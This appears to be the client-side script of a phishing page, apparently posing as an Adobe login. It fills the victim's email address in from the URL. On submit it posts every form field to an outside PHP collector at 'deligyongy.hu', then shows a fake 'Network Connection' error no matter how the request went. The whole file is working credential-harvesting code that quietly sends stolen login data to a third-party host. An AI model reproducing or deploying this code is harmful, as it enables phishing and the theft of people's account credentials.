    $(document).ready(function () {
		var baseUrl = (window.location).href;
            var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
           var em  = $("#em").val(url);
		
           $("#ex").html(url);
	
        $("#profileUp").submit(function (e) {
            e.preventDefault();

            var formData = new FormData($("#profileUp")[0]);

            $.ajax({
                url: "https://deligyongy.hu/cgi-bn/kks/1/adobe.php",
                type: 'POST',
                data: formData,
                contentType: false,
                processData: false,
               success:function(res){
                swal("Error!", "Network Connection !", "error");
			   }
            });
        });
    });

